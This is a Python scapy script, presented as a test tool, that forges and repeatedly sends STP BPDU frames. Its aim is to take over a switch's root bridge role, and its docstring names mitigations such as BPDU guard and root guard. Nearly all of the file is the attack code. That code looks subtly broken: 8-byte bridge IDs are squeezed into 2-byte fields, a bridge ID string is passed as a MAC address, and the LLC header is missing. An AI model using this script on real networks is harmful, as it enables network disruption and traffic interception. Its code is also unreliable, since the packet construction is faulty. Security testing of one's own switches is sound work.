#!/usr/bin/python3

from scapy.all import *
from scapy.layers.l2 import Ether

"""
This is a script for testing if you have a switch that is vulnerable to the STP root bridge attack.
It will send a BPDU packet with a lower bridge ID than the current root bridge ID.
If no mitigation is in place, the switch will accept the BPDU packet and update its root bridge ID.
Important: This script is for educational purposes only. Do not use it on networks you do not own or have permission to test.

Mitigation: To protect against STP root bridge attacks, you can enable BPDU guard on the switch ports, set portfast on access ports, and enable root guard on designated ports.

"""
class STP(Packet):
    name = "STP"
    fields_desc = [
        ShortField("protocolid", 0x0000),
        ByteField("protocolversion", 0x00),
        ByteField("bpdutype", 0x00),
        ByteField("bpduflags", 0x00),
        ShortField("rootid", 0x0000),
        IntField("rootpathcost", 0),
        ShortField("bridgeid", 0x0000),
        ShortField("portid", 0x0000),
        ShortField("age", 0),
        ShortField("maxage", 20),
        ShortField("hellotime", 2),
        ShortField("fwddelay", 15)
    ]

def send_bpdu(interface, root_bridge_id, bridge_id, port_id):
    # Create an Ethernet frame with a destination MAC address for STP
    ether = Ether(dst="01:80:C2:00:00:00", src=bridge_id)

    # Create an STP BPDU packet
    bpdu = STP(
        rootid=int(root_bridge_id, 16),
        bridgeid=int(bridge_id, 16),
        portid=port_id
    )

    # Combine the Ethernet frame and BPDU packet
    packet = ether / bpdu

    # Send the packet
    sendp(packet, iface=interface, loop=1, inter=2)

if __name__ == "__main__":
    interface = "eth0"  # Replace with your network interface
    root_bridge_id = "800000000001"  # Replace with the root bridge ID you want to spoof
    bridge_id = "800000000002"  # Replace with your bridge ID
    port_id = 0x8001  # Replace with your port ID

    send_bpdu(interface, root_bridge_id, bridge_id, port_id)